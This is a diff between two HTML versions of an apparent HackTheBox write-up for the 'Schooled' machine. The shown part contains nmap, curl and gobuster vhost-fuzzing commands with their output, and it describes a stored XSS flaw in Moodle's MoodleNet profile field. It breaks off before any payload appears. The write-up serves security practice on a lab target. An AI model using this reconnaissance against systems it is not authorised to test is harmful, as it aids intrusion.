@@ -1,292 +1,19 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  
-    <title>[HTB Writeup]: Schooled - HackTHeBox Machine :: Foxtrotlabs — In the middle of somewhere</title>
-  
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Info    Box Name     IP 10.10.10.234   OS FreeBSD   Pwned True   Vulnerability Stored XSS/Session Hijack/Priv Esc/RCE   Priv-esc Sudo NOPASSWD for pkg install   Obtained N/A   Retired TRUE    Recon The box schooled is rated as a medium box. It&amp;rsquo;s based on the FreeBSD 13 and features two vhosts. One with a static website and other one with moodle version 3." />
-<meta name="keywords" content="hacking" />
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="https://foxtrotlabs.cc/2021/09/htb-writeup-schooled-hackthebox-machine/" />
-
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-148414315-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-
-
-<link rel="stylesheet" href="https://foxtrotlabs.cc/assets/style.css">
-
-  <link rel="stylesheet" href="https://foxtrotlabs.cc/assets/blue.css">
-
-
-
-
-
-
-<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://foxtrotlabs.cc/img/apple-touch-icon-144-precomposed.png">
-
-  <link rel="shortcut icon" href="">
-
-
-
-<meta name="twitter:card" content="summary" />
-
-<meta name="twitter:creator" content="foxtrot_0xf4ult" />
-
-
-<meta property="og:locale" content="en" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="[HTB Writeup]: Schooled - HackTHeBox Machine :: Foxtrotlabs">
-<meta property="og:description" content="HackTheBox Schooled Writeup" />
-<meta property="og:url" content="https://foxtrotlabs.cc/2021/09/htb-writeup-schooled-hackthebox-machine/" />
-<meta property="og:site_name" content="[HTB Writeup]: Schooled - HackTHeBox Machine" />
-
-  <meta property="og:image" content="https://i.imgur.com/lk2SccP.png">
-
-<meta property="og:image:width" content="2048">
-<meta property="og:image:height" content="1024">
-
-
-  <meta property="article:published_time" content="2021-09-11 00:00:00 &#43;0100 &#43;0100" />
-
-
-
-
-
-
-
-
-
-
-
-
-</head>
-<body class="">
-
-
-<div class="container center headings--one-size">
-
-  <header class="header">
-  <div class="header__inner">
-    <div class="header__logo">
-      <a href="https://foxtrotlabs.cc/en">
-  <div class="logo">
-    foxtrotlabs-en
-  </div>
-</a>
-
-    </div>
-    <div class="menu-trigger">menu</div>
-  </div>
-  
-    <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
-    
-      
-        
-          <li><a href="https://foxtrotlabs.cc/posts">posts</a></li>
-        
-      
-        
-          <li><a href="https://foxtrotlabs.cc/pl">Polish side</a></li>
-        
-      
-        
-          <li><a href="https://foxtrotlabs.cc/about">about</a></li>
-        
-      
-        
-          <li><a href="https://github.com/s3gm3nt4ti0nf4ult">github</a></li>
-        
-      
-      
-    
-
-    
-  </ul>
-
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="https://foxtrotlabs.cc/posts">posts</a></li>
-      
-    
-      
-        <li><a href="https://foxtrotlabs.cc/pl">Polish side</a></li>
-      
-    
-      
-        <li><a href="https://foxtrotlabs.cc/about">about</a></li>
-      
-    
-      
-        <li><a href="https://github.com/s3gm3nt4ti0nf4ult">github</a></li>
-      
-    
-    
-  </ul>
-</nav>
-
-  
-  
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-148414315-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-</header>
-
-
-  <div class="content">
-    
-<div class="post">
-  <h1 class="post-title">
-    <a href="https://foxtrotlabs.cc/2021/09/htb-writeup-schooled-hackthebox-machine/">[HTB Writeup]: Schooled - HackTHeBox Machine</a></h1>
-  <div class="post-meta">
-    
-      <span class="post-date">
-        2021-09-11 
-      </span>
-    
-    
-    <span class="post-author">::
-      foxtrot_charlie
-    </span>
-    
-  </div>
-
-  
-  <span class="post-tags">
-    
-    #<a href="https://foxtrotlabs.cc/tags/hacking/">hacking</a>&nbsp;
-    
-    #<a href="https://foxtrotlabs.cc/tags/ctf/">ctf</a>&nbsp;
-    
-    #<a href="https://foxtrotlabs.cc/tags/htb/">htb</a>&nbsp;
-    
-    #<a href="https://foxtrotlabs.cc/tags/pwned/">pwned</a>&nbsp;
-    
-    #<a href="https://foxtrotlabs.cc/tags/hashcat/">hashcat</a>&nbsp;
-    
-    #<a href="https://foxtrotlabs.cc/tags/pwned/">pwned</a>&nbsp;
-    
-    #<a href="https://foxtrotlabs.cc/tags/hackthebox/">hackthebox</a>&nbsp;
-    
-    #<a href="https://foxtrotlabs.cc/tags/challenge/">challenge</a>&nbsp;
-    
-    #<a href="https://foxtrotlabs.cc/tags/stored_xss/">stored_xss</a>&nbsp;
-    
-    #<a href="https://foxtrotlabs.cc/tags/rce/">rce</a>&nbsp;
-    
-    #<a href="https://foxtrotlabs.cc/tags/pkg/">pkg</a>&nbsp;
-    
-    #<a href="https://foxtrotlabs.cc/tags/sudo/">sudo</a>&nbsp;
-    
-  </span>
-  
-
-  
-    <img src="https://i.imgur.com/lk2SccP.png" class="post-cover" alt="[HTB Writeup]: Schooled - HackTHeBox Machine" />
-  
-
-  
-    <div class="table-of-contents">
-      <h2>
-        
-          Table of Contents
-        
-      </h2>
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#info">Info</a></li>
-    <li><a href="#recon">Recon</a>
-      <ul>
-        <li><a href="#nmap">Nmap</a></li>
-        <li><a href="#poking-around">Poking around</a></li>
-      </ul>
-    </li>
-    <li><a href="#foothold">Foothold</a></li>
-    <li><a href="#priv-esc">Priv Esc</a>
-      <ul>
-        <li><a href="#vertical-priv-esc">Vertical priv esc</a></li>
-      </ul>
-    </li>
-    <li><a href="#post-exploitation">Post exploitation</a></li>
-  </ul>
-</nav>
-    </div>
-  
-
-  <div class="post-content"><div>
-        <right>
-    <script src="https://www.hackthebox.eu/achievement/machine/33441/335"></script>
-</right>
-<p><img src="badge.png" alt="Badge"></p>
-<h2 id="info">Info<a href="#info" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<table>
-<thead>
-<tr>
-<th>Box</th>
-<th><code>Name</code></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>IP</td>
-<td><code>10.10.10.234</code></td>
-</tr>
-<tr>
-<td>OS</td>
-<td><code>FreeBSD</code></td>
-</tr>
-<tr>
-<td>Pwned</td>
-<td>True</td>
-</tr>
-<tr>
-<td>Vulnerability</td>
-<td>Stored XSS/Session Hijack/Priv Esc/RCE</td>
-</tr>
-<tr>
-<td>Priv-esc</td>
-<td>Sudo NOPASSWD for pkg install</td>
-</tr>
-<tr>
-<td>Obtained</td>
-<td>N/A</td>
-</tr>
-<tr>
-<td>Retired</td>
-<td>TRUE</td>
-</tr>
-</tbody>
-</table>
-<p><img src="cover.png" alt="Cover"></p>
-<h2 id="recon">Recon<a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<p>The box <code>schooled</code> is rated as a medium box. It&rsquo;s based on the FreeBSD 13 and features two vhosts. One with a static website and other one with <code>moodle</code> version 3.9.0-beta.</p>
-<h3 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<p>Basic nmap scan reveals only three services. But before we begin, let&rsquo;s put the <code>schooled.htb</code> in <code>/etc/hosts</code>.</p>
-<pre tabindex="0"><code>╰─○ sudo nmap -Pn -sC -sV -p- --script-timeout 30 schooled.htb -oA tcp_schooled -vv
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+<!doctype html><html lang=en><head><title>[HTB Writeup]: Schooled - HackTHeBox Machine :: Foxtrotlabs — In the middle of somewhere</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Info    Box Name     IP 10.10.10.234   OS FreeBSD   Pwned True   Vulnerability Stored XSS/Session Hijack/Priv Esc/RCE   Priv-esc Sudo NOPASSWD for pkg install   Obtained N/A   Retired TRUE    Recon The box schooled is rated as a medium box. It&amp;rsquo;s based on the FreeBSD 13 and features two vhosts. One with a static website and other one with moodle version 3."><meta name=keywords content="hacking"><meta name=robots content="noodp"><link rel=canonical href=https://foxtrotlabs.cc/2021/09/htb-writeup-schooled-hackthebox-machine/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script><link rel=stylesheet href=https://foxtrotlabs.cc/assets/style.css><link rel=stylesheet href=https://foxtrotlabs.cc/assets/blue.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=https://foxtrotlabs.cc/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href><meta name=twitter:card content="summary"><meta name=twitter:creator content="foxtrot_0xf4ult"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="[HTB Writeup]: Schooled - HackTHeBox Machine :: Foxtrotlabs"><meta property="og:description" content="HackTheBox Schooled Writeup"><meta property="og:url" content="https://foxtrotlabs.cc/2021/09/htb-writeup-schooled-hackthebox-machine/"><meta property="og:site_name" content="[HTB Writeup]: Schooled - HackTHeBox Machine"><meta property="og:image" content="https://i.imgur.com/lk2SccP.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2021-09-11 00:00:00 +0100 +0100"></head><body><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=https://foxtrotlabs.cc/en><div class=logo>foxtrotlabs-en</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=https://foxtrotlabs.cc/posts>posts</a></li><li><a href=https://foxtrotlabs.cc/pl>Polish side</a></li><li><a href=https://foxtrotlabs.cc/about>about</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=https://foxtrotlabs.cc/posts>posts</a></li><li><a href=https://foxtrotlabs.cc/pl>Polish side</a></li><li><a href=https://foxtrotlabs.cc/about>about</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul></nav><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script></header><div class=content><div class=post><h1 class=post-title><a href=https://foxtrotlabs.cc/2021/09/htb-writeup-schooled-hackthebox-machine/>[HTB Writeup]: Schooled - HackTHeBox Machine</a></h1><div class=post-meta><span class=post-date>2021-09-11</span>
+<span class=post-author>::
+foxtrot_charlie</span></div><span class=post-tags>#<a href=https://foxtrotlabs.cc/tags/hacking/>hacking</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/ctf/>ctf</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/htb/>htb</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/pwned/>pwned</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/hashcat/>hashcat</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/pwned/>pwned</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/hackthebox/>hackthebox</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/challenge/>challenge</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/stored_xss/>stored_xss</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/rce/>rce</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/pkg/>pkg</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/sudo/>sudo</a>&nbsp;</span>
+<img src=https://i.imgur.com/lk2SccP.png class=post-cover alt="[HTB Writeup]: Schooled - HackTHeBox Machine"><div class=table-of-contents><h2>Table of Contents</h2><nav id=TableOfContents><ul><li><a href=#info>Info</a></li><li><a href=#recon>Recon</a><ul><li><a href=#nmap>Nmap</a></li><li><a href=#poking-around>Poking around</a></li></ul></li><li><a href=#foothold>Foothold</a></li><li><a href=#priv-esc>Priv Esc</a><ul><li><a href=#vertical-priv-esc>Vertical priv esc</a></li></ul></li><li><a href=#post-exploitation>Post exploitation</a></li></ul></nav></div><div class=post-content><div><right><script src=https://www.hackthebox.eu/achievement/machine/33441/335></script></right><p><img src=badge.png alt=Badge></p><h2 id=info>Info<a href=#info class=hanchor arialabel=Anchor>&#8983;</a></h2><table><thead><tr><th>Box</th><th><code>Name</code></th></tr></thead><tbody><tr><td>IP</td><td><code>10.10.10.234</code></td></tr><tr><td>OS</td><td><code>FreeBSD</code></td></tr><tr><td>Pwned</td><td>True</td></tr><tr><td>Vulnerability</td><td>Stored XSS/Session Hijack/Priv Esc/RCE</td></tr><tr><td>Priv-esc</td><td>Sudo NOPASSWD for pkg install</td></tr><tr><td>Obtained</td><td>N/A</td></tr><tr><td>Retired</td><td>TRUE</td></tr></tbody></table><p><img src=cover.png alt=Cover></p><h2 id=recon>Recon<a href=#recon class=hanchor arialabel=Anchor>&#8983;</a></h2><p>The box <code>schooled</code> is rated as a medium box. It&rsquo;s based on the FreeBSD 13 and features two vhosts. One with a static website and other one with <code>moodle</code> version 3.9.0-beta.</p><h3 id=nmap>Nmap<a href=#nmap class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Basic nmap scan reveals only three services. But before we begin, let&rsquo;s put the <code>schooled.htb</code> in <code>/etc/hosts</code>.</p><pre tabindex=0><code>╰─○ sudo nmap -Pn -sC -sV -p- --script-timeout 30 schooled.htb -oA tcp_schooled -vv
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-30 19:24 CEST
 NSE: Loaded 153 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -373,45 +100,45 @@ PORT      STATE SERVICE REASON         VERSION
 33060/tcp open  mysqlx? syn-ack ttl 63
 | fingerprint-strings: 
 |   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
-|     Invalid message&quot;
+|     Invalid message&#34;
 |     HY000
 |   LDAPBindReq: 
-|     *Parse error unserializing protobuf message&quot;
+|     *Parse error unserializing protobuf message&#34;
 |     HY000
 |   oracle-tns: 
-|     Invalid message-frame.&quot;
+|     Invalid message-frame.&#34;
 |_    HY000
 1 ser vice unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port33060-TCP:V=7.91%I=7%D=6/30%Time=60DCAFA1%P=x86_64-pc-linux-gnu%r(N
-SF:ULL,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(GenericLines,9,&quot;\x05\0\0\0\x0b\
-SF:x08\x05\x1a\0&quot;)%r(GetRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(HTTPOp
-SF:tions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(RTSPRequest,9,&quot;\x05\0\0\0\x0b
-SF:\x08\x05\x1a\0&quot;)%r(RPCCheck,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSVers
-SF:ionBindReqTCP,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSStatusRequestTCP,2
-SF:B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
-SF:nvalid\x20message\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)
-SF:%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
-SF:\x10\x88'\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(TerminalServerCookie
-SF:,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TLSSessionReq,2B,&quot;\x05\0\0\0\x0b\x
-SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\&quot;
-SF:\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,9
-SF:,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05\
-SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\&quot;\x05HY0
-SF:00&quot;)%r(FourOhFourRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LPDString,
-SF:9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LDAPSearchReq,2B,&quot;\x05\0\0\0\x0b\x0
-SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\&quot;\
-SF:x05HY000&quot;)%r(LDAPBindReq,46,&quot;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\
-SF:x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me
-SF:ssage\&quot;\x05HY000&quot;)%r(SIPOptions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LAN
-SF:Desk-RC,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TerminalServer,9,&quot;\x05\0\0\
-SF:0\x0b\x08\x05\x1a\0&quot;)%r(NCP,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NotesRP
-SF:C,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
-SF:0fInvalid\x20message\&quot;\x05HY000&quot;)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x05\x
-SF:1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,32,&quot;
-SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid
-SF:\x20message-frame\.\&quot;\x05HY000&quot;)%r(ms-sql-s,9,&quot;\x05\0\0\0\x0b\x08\x05\x
-SF:1a\0&quot;)%r(afp,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
-SF:\x88'\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;);
+SF:ULL,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(GenericLines,9,&#34;\x05\0\0\0\x0b\
+SF:x08\x05\x1a\0&#34;)%r(GetRequest,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(HTTPOp
+SF:tions,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(RTSPRequest,9,&#34;\x05\0\0\0\x0b
+SF:\x08\x05\x1a\0&#34;)%r(RPCCheck,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(DNSVers
+SF:ionBindReqTCP,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(DNSStatusRequestTCP,2
+SF:B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fI
+SF:nvalid\x20message\&#34;\x05HY000&#34;)%r(Help,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)
+SF:%r(SSLSessionReq,2B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
+SF:\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(TerminalServerCookie
+SF:,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(TLSSessionReq,2B,&#34;\x05\0\0\0\x0b\x
+SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;
+SF:\x05HY000&#34;)%r(Kerberos,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(SMBProgNeg,9
+SF:,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(X11Probe,2B,&#34;\x05\0\0\0\x0b\x08\x05\
+SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;\x05HY0
+SF:00&#34;)%r(FourOhFourRequest,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(LPDString,
+SF:9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(LDAPSearchReq,2B,&#34;\x05\0\0\0\x0b\x0
+SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;\
+SF:x05HY000&#34;)%r(LDAPBindReq,46,&#34;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\
+SF:x08\x01\x10\x88&#39;\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me
+SF:ssage\&#34;\x05HY000&#34;)%r(SIPOptions,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(LAN
+SF:Desk-RC,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(TerminalServer,9,&#34;\x05\0\0\
+SF:0\x0b\x08\x05\x1a\0&#34;)%r(NCP,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(NotesRP
+SF:C,2B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x
+SF:0fInvalid\x20message\&#34;\x05HY000&#34;)%r(JavaRMI,9,&#34;\x05\0\0\0\x0b\x08\x05\x
+SF:1a\0&#34;)%r(WMSRequest,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(oracle-tns,32,&#34;
+SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x16Invalid
+SF:\x20message-frame\.\&#34;\x05HY000&#34;)%r(ms-sql-s,9,&#34;\x05\0\0\0\x0b\x08\x05\x
+SF:1a\0&#34;)%r(afp,2B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
+SF:\x88&#39;\x1a\x0fInvalid\x20message\&#34;\x05HY000&#34;);
 Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
 
 NSE: Script Post-scanning.
@@ -428,28 +155,20 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 1739.64 seconds
            Raw packets sent: 68026 (2.993MB) | Rcvd: 111199 (13.540MB)
-</code></pre><h3 id="poking-around">Poking around<a href="#poking-around" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<p>Three services are available. Two well known an updated <code>http</code> and a <code>ssh</code> server. There is also a mysterious <code>33060</code> port that is not being recognized by the scanner (multiplied by 10 <code>3306 - default MySQL port</code>?).</p>
-<h4 id="http-overview">HTTP overview<a href="#http-overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
-<p>Putting other services for later, the first one to be tried is of course a <code>HTTP</code>.</p>
-<pre tabindex="0"><code>╰─○ curl -ksi http://schooled.htb
+</code></pre><h3 id=poking-around>Poking around<a href=#poking-around class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Three services are available. Two well known an updated <code>http</code> and a <code>ssh</code> server. There is also a mysterious <code>33060</code> port that is not being recognized by the scanner (multiplied by 10 <code>3306 - default MySQL port</code>?).</p><h4 id=http-overview>HTTP overview<a href=#http-overview class=hanchor arialabel=Anchor>&#8983;</a></h4><p>Putting other services for later, the first one to be tried is of course a <code>HTTP</code>.</p><pre tabindex=0><code>╰─○ curl -ksi http://schooled.htb
 HTTP/1.1 200 OK
 Date: Wed, 30 Jun 2021 19:43:48 GMT
 Server: Apache/2.4.46 (FreeBSD) PHP/7.4.15
 Last-Modified: Sat, 19 Dec 2020 17:23:57 GMT
-ETag: &quot;510e-5b6d47d6a6540&quot;
+ETag: &#34;510e-5b6d47d6a6540&#34;
 Accept-Ranges: bytes
 Content-Length: 20750
 Content-Type: text/html
 
 &lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
+&lt;html lang=&#34;en&#34;&gt;
 [...]
-</code></pre><p>The server is <code>Apache 2.4.48</code> running with <code>PHP 7.4.15</code>. And the address <code>http://schooled.htb</code> presents a static website</p>
-<p><img src="main_page.png" alt="main"></p>
-<p>Further research shows that there is not much info there. Event the contact form <code>/contact.html</code> is not working properly (there is no such file as <code>contact.php</code>).</p>
-<p>Natural thing to check in this case is to run a fuzzer against vhosts on the target server.</p>
-<pre tabindex="0"><code>╰─○ gobuster vhost -u http://schooled.htb/ -w /usr/share/dirb/wordlists/common.txt -o subdomains_80_gobuster.txt
+</code></pre><p>The server is <code>Apache 2.4.48</code> running with <code>PHP 7.4.15</code>. And the address <code>http://schooled.htb</code> presents a static website</p><p><img src=main_page.png alt=main></p><p>Further research shows that there is not much info there. Event the contact form <code>/contact.html</code> is not working properly (there is no such file as <code>contact.php</code>).</p><p>Natural thing to check in this case is to run a fuzzer against vhosts on the target server.</p><pre tabindex=0><code>╰─○ gobuster vhost -u http://schooled.htb/ -w /usr/share/dirb/wordlists/common.txt -o subdomains_80_gobuster.txt
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -491,40 +210,30 @@ Found: ~www.schooled.htb (Status: 400) [Size: 347]
 Found: ~webmaster.schooled.htb (Status: 400) [Size: 347]    
 Found: lost+found.schooled.htb (Status: 400) [Size: 347]    
 Found: moodle.schooled.htb (Status: 200) [Size: 84]  
-</code></pre><p>Given the fact that there is only one return code <code>200</code> the <code>moodle</code> software seems interesting.</p>
-<p><img src="moodle.png" alt="moodle"></p>
-<p>There are four courses there and a login page, that might be used to login or register an account. The only one thing checked is the domain of the email address. It should be within the <code>@student.schooled.htb</code></p>
-<p>Unfortunately the student privilege is not enough to do something interesting within the <code>moodle</code> software. But the newly created student is able to enroll the Maths course.</p>
-<p>The message from the lecturer says that he will be checking on the periodically to ensure that all students have filled in the <code>MoodleNet</code> part of their profile. The <a href="https://moodle.com/moodlenet/"><code>MoodleNet</code></a> is a social media platform for educators.</p>
-<p>Fortunately for us, there is a stored XSS vulnerability in the <code>MoodleNet</code> field inside students' profile. This vuln is described <a href="">here</a> and as the commit shows it&rsquo;s due to lack of sanitization of the <code>userprofile</code> field:</p>
-<pre tabindex="0"><code>diff --git a/admin/tool/moodlenet/classes/profile_manager.php b/admin/tool/moodlenet/classes/profile_manager.php
+</code></pre><p>Given the fact that there is only one return code <code>200</code> the <code>moodle</code> software seems interesting.</p><p><img src=moodle.png alt=moodle></p><p>There are four courses there and a login page, that might be used to login or register an account. The only one thing checked is the domain of the email address. It should be within the <code>@student.schooled.htb</code></p><p>Unfortunately the student privilege is not enough to do something interesting within the <code>moodle</code> software. But the newly created student is able to enroll the Maths course.</p><p>The message from the lecturer says that he will be checking on the periodically to ensure that all students have filled in the <code>MoodleNet</code> part of their profile. The <a href=https://moodle.com/moodlenet/><code>MoodleNet</code></a> is a social media platform for educators.</p><p>Fortunately for us, there is a stored XSS vulnerability in the <code>MoodleNet</code> field inside students&rsquo; profile. This vuln is described <a href>here</a> and as the commit shows it&rsquo;s due to lack of sanitization of the <code>userprofile</code> field:</p><pre tabindex=0><code>diff --git a/admin/tool/moodlenet/classes/profile_manager.php b/admin/tool/moodlenet/classes/profile_manager.php
 index f1a922a..49027fd 100644 (file)
 --- a/admin/tool/moodlenet/classes/profile_manager.php
 +++ b/admin/tool/moodlenet/classes/profile_manager.php
 @@ -46,7 +46,7 @@ class profile_manager {
-             $user = \core_user::get_user($userid, 'moodlenetprofile');
+             $user = \core_user::get_user($userid, &#39;moodlenetprofile&#39;);
              try {
-                 $userprofile = $user-&gt;moodlenetprofile ? $user-&gt;moodlenetprofile : '';
